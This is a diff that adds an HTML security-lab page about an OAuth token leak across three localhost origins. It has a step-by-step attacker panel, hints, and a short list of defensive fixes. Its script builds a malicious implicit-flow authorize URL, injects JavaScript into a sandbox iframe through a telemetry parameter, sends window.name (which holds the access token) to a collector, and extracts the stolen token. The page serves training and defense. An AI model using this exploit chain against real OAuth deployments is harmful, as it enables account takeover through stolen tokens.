@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dash — Product Analytics</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:#f8fafc;color:#0f172a}
+    .nav{background:#fff;border-bottom:1px solid #e2e8f0;height:56px;display:flex;align-items:center;padding:0 28px;justify-content:space-between}
+    .brand{font-weight:800;font-size:17px;color:#4f46e5}
+    .links{display:flex;gap:22px;font-size:13px}.links a{color:#64748b;text-decoration:none;font-weight:500}.links a.active{color:#4f46e5}
+    .user{display:flex;align-items:center;gap:10px;font-size:13px;color:#64748b}
+    .avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px}
+    .container{max-width:1100px;margin:28px auto;padding:0 24px}
+    h1{font-size:22px;font-weight:800;margin-bottom:4px}.sub{font-size:13px;color:#64748b;margin-bottom:22px}
+    .card{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:22px;margin-bottom:14px}
+    .card h2{font-size:15px;font-weight:700;margin-bottom:4px}.card .note{font-size:12px;color:#94a3b8;margin-bottom:14px}
+    .env-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:18px}
+    .env{background:#fff;border:1px solid #e2e8f0;border-radius:10px;padding:14px;font-size:12px}
+    .env .role{font-size:10px;text-transform:uppercase;letter-spacing:0.06em;color:#94a3b8;margin-bottom:4px}
+    .env .url{font-family:monospace;color:#4f46e5;font-weight:600}
+    .env .dot{width:7px;height:7px;border-radius:50%;background:#22c55e;display:inline-block;margin-right:4px}
+    .env.down .dot{background:#ef4444}
+    .grid{display:grid;grid-template-columns:2fr 1fr;gap:16px}
+    .btn{padding:9px 16px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;border:none}
+    .btn-primary{background:#4f46e5;color:#fff}.btn-primary:hover{background:#4338ca}
+    .btn-secondary{background:#f1f5f9;color:#475569;border:1px solid #e2e8f0}.btn-secondary:hover{background:#e2e8f0}
+    .btn-danger{background:#dc2626;color:#fff}.btn-danger:hover{background:#b91c1c}
+    .metric-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:12px}
+    .metric{background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:12px}
+    .metric .v{font-size:20px;font-weight:800}.metric .k{font-size:11px;color:#94a3b8}
+    pre{background:#0f172a;color:#e2e8f0;padding:12px;border-radius:8px;font-family:'Fira Code',monospace;font-size:11px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5}
+    .log-pane{background:#020617;color:#a5f3fc;padding:12px;border-radius:8px;font-family:'Fira Code',monospace;font-size:11px;max-height:260px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;border:1px solid #1e293b;margin-top:10px}
+    .log-pane .hit{color:#fca5a5;font-weight:600}.log-pane .ok{color:#86efac}.log-pane .warn{color:#fde047}
+    .attacker{background:#fef2f2;border:2px dashed #fecaca}
+    .attacker h2{color:#991b1b}
+    .step{padding:14px 16px;border:1px solid #e2e8f0;border-radius:10px;margin-bottom:10px;background:#fff}
+    .step-num{display:inline-block;width:22px;height:22px;border-radius:50%;background:#4f46e5;color:#fff;font-size:11px;font-weight:700;text-align:center;line-height:22px;margin-right:8px}
+    .step.done{background:#f0fdf4;border-color:#86efac}
+    .step.done .step-num{background:#22c55e}
+    .label{font-size:12px;color:#475569;margin-right:8px}
+    .kv{font-family:monospace;font-size:11px;color:#475569;word-break:break-all}
+    .token-box{background:#fef2f2;border:1px solid #fecaca;color:#7f1d1d;padding:10px 14px;border-radius:8px;font-family:monospace;font-size:11px;word-break:break-all;margin-top:8px;display:none}
+    .token-box.show{display:block}
+  </style>
+</head>
+<body>
+  <nav class="nav">
+    <div class="brand">Dash</div>
+    <div class="links">
+      <a href="#" class="active">Overview</a>
+      <a href="#">Funnels</a>
+      <a href="#">Cohorts</a>
+      <a href="#">Settings</a>
+    </div>
+    <div class="user">
+      <span id="nav-name">Guest</span>
+      <div class="avatar" id="nav-av">?</div>
+    </div>
+  </nav>
+
+  <div class="container">
+    <h1>Dirty Dancing — Multi-Origin Token Leak</h1>
+    <p class="sub">A product-analytics SaaS that uses a separate SSO provider and a "sandbox" analytics iframe.</p>
+
+    <div class="env-grid">
+      <div class="env" id="env-main"><div class="role">Main App</div><span class="dot"></span><span class="url">localhost:3000</span><div style="margin-top:4px;color:#64748b">You are here</div></div>
+      <div class="env" id="env-idp"><div class="role">OAuth IdP</div><span class="dot"></span><span class="url">localhost:4000</span><div style="margin-top:4px;color:#64748b">Separate origin</div></div>
+      <div class="env" id="env-sbx"><div class="role">Sandbox</div><span class="dot"></span><span class="url">localhost:5000</span><div style="margin-top:4px;color:#64748b">Loaded by callback</div></div>
+    </div>
+
+    <div class="card">
+      <h2>What the main app does</h2>
+      <div class="note">The Dash product team wanted an "analytics sandbox" to isolate third-party telemetry code. The analytics iframe is loaded from <code>localhost:5000</code>. To give the sandbox context (referrer, URL), the callback page sets <code>iframe.name = JSON.stringify({href, referrer})</code> before loading. Reasonable, right?</div>
+      <div class="metric-grid">
+        <div class="metric"><div class="v">1.2M</div><div class="k">Events/day</div></div>
+        <div class="metric"><div class="v">14</div><div class="k">Integrations</div></div>
+        <div class="metric"><div class="v">$12.4k</div><div class="k">MRR</div></div>
+      </div>
+      <button class="btn btn-primary" onclick="startLegitFlow()">Sign in with SSO (legit)</button>
+      <button class="btn btn-secondary" onclick="openCallbackSource()">View callback page source</button>
+    </div>
+
+    <div class="grid">
+      <div>
+        <div class="card attacker">
+          <h2>🧪 Attacker control panel</h2>
+          <div class="note" style="color:#7f1d1d">In a real attack this runs on <code>evil.com</code>. For the lab it's here. The attacker controls the <code>telemetry</code> query parameter that the callback passes into the sandbox's XSS sink.</div>
+
+          <div class="step" id="step-1">
+            <div><span class="step-num">1</span><strong>Victim signs in to the IdP</strong> (separate origin). The cookie must be set on <code>localhost:4000</code> before the exploit fires.</div>
+            <div style="margin-top:8px">
+              <button class="btn btn-secondary" onclick="openIdpLogin()">Open IdP login (once)</button>
+              <span class="label">→</span>
+              <button class="btn btn-secondary" onclick="checkIdp()">Check IdP status</button>
+              <span id="idp-status" class="kv" style="margin-left:6px"></span>
+            </div>
+          </div>
+
+          <div class="step" id="step-2">
+            <div><span class="step-num">2</span><strong>Craft the malicious OAuth URL.</strong> <code>response_type=token</code> puts the token in the fragment. <code>telemetry=</code> injects our JS into the sandbox. <code>state=bad_state</code> forces the "sign-in failed" branch but the token stays in the URL.</div>
+            <pre id="mal-url" style="margin-top:8px"></pre>
+          </div>
+
+          <div class="step" id="step-3">
+            <div><span class="step-num">3</span><strong>Open the flow in a popup.</strong> The IdP redirects to <code>/dd/callback#access_token=...</code>. Our telemetry JS runs in the sandbox iframe.</div>
+            <button class="btn btn-danger" onclick="firePopup()" style="margin-top:8px">Fire exploit (open popup)</button>
+          </div>
+
+          <div class="step" id="step-4">
+            <div><span class="step-num">4</span><strong>Sandbox JS reads <code>window.name</code></strong> (set by main app before load). Exfils to our collector.</div>
+            <button class="btn btn-secondary" onclick="pollExfil()" style="margin-top:8px">Poll collector</button>
+            <div id="stolen" class="token-box"></div>
+          </div>
+
+          <div id="attack-log" class="log-pane" style="display:none"></div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <h2>Injected telemetry (attacker-controlled)</h2>
+          <div class="note">This is the JavaScript the attacker smuggles into <code>?telemetry=</code>. It runs inside the sandbox iframe with access to <code>window.name</code>.</div>
+          <pre id="inj-js" style="font-size:10px"></pre>
+        </div>
+        <div class="card">
+          <h2>Why it works</h2>
+          <ul style="font-size:12px;color:#475569;line-height:1.8;padding-left:18px">
+            <li>IdP keeps the token in the URL even when the app rejects the state</li>
+            <li>Main app stores <code>location.href</code> in <code>iframe.name</code> before load</li>
+            <li>The iframe origin (<code>:5000</code>) has an XSS sink</li>
+            <li>Attacker's JS runs in sandbox origin, reads <code>window.name</code>, exfils</li>
+          </ul>
+        </div>
+        <div class="card">
+          <h2>What to check in production</h2>
+          <ul style="font-size:12px;color:#475569;line-height:1.8;padding-left:18px">
+            <li>Strip the fragment via <code>history.replaceState</code> on arrival</li>
+            <li>Never pass sensitive context into iframe <code>name</code> attribute</li>
+            <li>Never reflect attacker-controllable input into a sandbox's <code>&lt;script&gt;</code> tag</li>
+            <li>Use PKCE + authorization code flow instead of implicit</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: Multi-Origin Token Leak</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">Three origins, three bugs. The glue that breaks everything is <code>iframe.name</code>.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">1</div><span>Map the architecture</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Main app on :3000 → opens OAuth on :4000 → redirects back to :3000 with token in fragment → :3000 loads analytics iframe from :5000. The iframe's origin has an XSS sink. Your JS ends up running there.
+        </div>
+      </div>
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">2</div><span>Find the leak primitive</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Before setting <code>iframe.src</code>, the main app does <code>iframe.name = JSON.stringify({href, referrer})</code>. Inside the iframe, <code>window.name</code> is that string. Your XSS in the iframe reads <code>window.name</code> — which contains the token.
+        </div>
+      </div>
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">3</div><span>Find the XSS in the sandbox</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          <code>/embed?src=XYZ</code> reflects XYZ raw into a <code>&lt;script&gt;</code> tag. Anything you put there runs. The main app URL-encodes the <code>telemetry</code> query param and passes it through — so if you control <code>telemetry</code>, you get XSS on :5000.
+        </div>
+      </div>
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">4</div><span>Put it together</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Malicious URL: <code>/dd/callback?state=bad&telemetry=&lt;your JS&gt;</code> reached via IdP implicit redirect. Your JS exfils <code>window.name</code> to the collector.
+        </div>
+      </div>
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Run it automatically</button>
+        <div class="hint-spoiler-content">
+          Make sure you've signed into the IdP once (step 1). Then click "Fire exploit". The popup opens, OAuth auto-approves, the callback loads the sandbox with your JS, and the collector fills up within a second.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('chain-dd-multi', 'xss');
+
+    var MAIN   = 'http://localhost:3000';
+    var IDP    = 'http://localhost:4000';
+    var SBX    = 'http://localhost:5000';
+
+    // This is the JS the attacker smuggles into ?telemetry=
+    // It runs inside the sandbox iframe (:5000 origin).
+    // window.name was set by the main app to JSON.stringify({href, referrer}).
+    var TELEMETRY_JS =
+      "try {" +
+      "  var payload = window.name;" +
+      "  var img = new Image();" +
+      "  img.src = '" + MAIN + "/dd/collect?data=' + encodeURIComponent(payload);" +
+      "} catch(e) {}";
+
+    document.getElementById('inj-js').textContent = TELEMETRY_JS;
+
+    function buildMaliciousUrl() {
+      var redirectUri = MAIN + '/dd/callback?state=bad_state&telemetry=' + encodeURIComponent(TELEMETRY_JS);
+      var url = IDP + '/authorize' +
+        '?client_id=dash' +
+        '&response_type=token' +
+        '&redirect_uri=' + encodeURIComponent(redirectUri) +
+        '&state=victim_session' +
+        '&scope=read';
+      return url;
+    }
+
+    document.getElementById('mal-url').textContent = buildMaliciousUrl();
+
+    function log(msg, cls) {
+      var el = document.getElementById('attack-log');
+      el.style.display = 'block';
+      var line = document.createElement('div');
+      if (cls) line.className = cls;
+      line.textContent = '> ' + msg;
+      el.appendChild(line);
+      el.scrollTop = el.scrollHeight;
+    }
+
+    function mark(step) {
+      document.getElementById('step-' + step).classList.add('done');
+    }
+
+    function openIdpLogin() {
+      window.open(IDP + '/', 'idp-login', 'width=480,height=480');
+      log('Opened IdP login window at ' + IDP, 'ok');
+    }
+
+    function checkIdp() {
+      // Probe the IdP by asking /authorize for a code flow — if logged in we get a redirect.
+      // Use fetch with redirect:manual to avoid full navigation.
+      fetch(IDP + '/authorize?client_id=dash&response_type=code&redirect_uri=' +
+            encodeURIComponent(MAIN + '/dd/callback') +
+            '&state=probe&scope=read', { redirect: 'manual', mode: 'no-cors' })
+        .then(function() {
+          document.getElementById('idp-status').textContent = '(probe sent — check popup state)';
+          log('IdP probed. If cookie is set on :4000, the next exploit fires silently.', 'warn');
+          mark(1);
+        })
+        .catch(function(e){ document.getElementById('idp-status').textContent = e.message; });
+    }
+
+    function openCallbackSource() {
+      window.open(MAIN + '/dd/callback?state=demo#access_token=DEMO_TOKEN_FOR_INSPECTION&token_type=bearer',
+                  'callback-demo', 'width=640,height=500');
+    }
+
+    function firePopup() {
+      log('Opening popup with malicious OAuth URL...', 'warn');
+      var w = window.open(buildMaliciousUrl(), 'dd-popup', 'width=640,height=560');
+      if (!w) { log('Popup blocked — allow popups for localhost.', 'hit'); return; }
+      mark(2);
+      setTimeout(function(){ mark(3); pollExfil(true); }, 1500);
+    }
+
+    function startLegitFlow() {
+      sessionStorage.setItem('dd_state', 'expected_state_xyz');
+      var redirect = MAIN + '/dd/callback?state=expected_state_xyz';
+      window.open(IDP + '/authorize?client_id=dash&response_type=code&redirect_uri=' +
+                  encodeURIComponent(redirect) + '&state=expected_state_xyz&scope=read',
+                  'legit-flow', 'width=640,height=560');
+    }
+
+    var pollTimer = null;
+    function pollExfil(fromExploit) {
+      if (pollTimer) clearTimeout(pollTimer);
+      fetch(MAIN + '/dd/collected').then(function(r){ return r.json(); }).then(function(d){
+        if (d.entries && d.entries.length) {
+          // Find the most recent exfil
+          var last = d.entries[d.entries.length - 1];
+          var decoded;
+          try {
+            decoded = decodeURIComponent(last.data);
+          } catch(e) { decoded = last.data; }
+          var parsed;
+          try { parsed = JSON.parse(decoded); } catch(e) { parsed = { raw: decoded }; }
+
+          var href = parsed.href || '';
+          var m = href.match(/access_token=([^&]+)/);
+          var token = m ? m[1] : null;
+
+          log('Collector received ' + d.entries.length + ' entry(s)', 'hit');
+          log('Victim URL: ' + href, 'hit');
+          if (token) {
+            log('ACCESS TOKEN: ' + token, 'hit');
+            var box = document.getElementById('stolen');
+            box.classList.add('show');
+            box.innerHTML =
+              '<div style="font-weight:700;margin-bottom:4px">STOLEN TOKEN</div>' +
+              '<div>' + token + '</div>' +
+              '<div style="margin-top:6px;color:#991b1b;font-size:10px">href: ' + href + '</div>';
+            mark(4);
+            if (typeof solveLab === 'function') solveLab('chain-dd-multi');
+            return;
+          }
+        }
+        if (fromExploit) {
+          pollTimer = setTimeout(function(){ pollExfil(true); }, 700);
+        }
+      });
+    }
+
+    // Clear collector on load so previous runs don't confuse the demo
+    fetch(MAIN + '/dd/clear', { method: 'POST' });
+  </script>
+</body>
+</html>
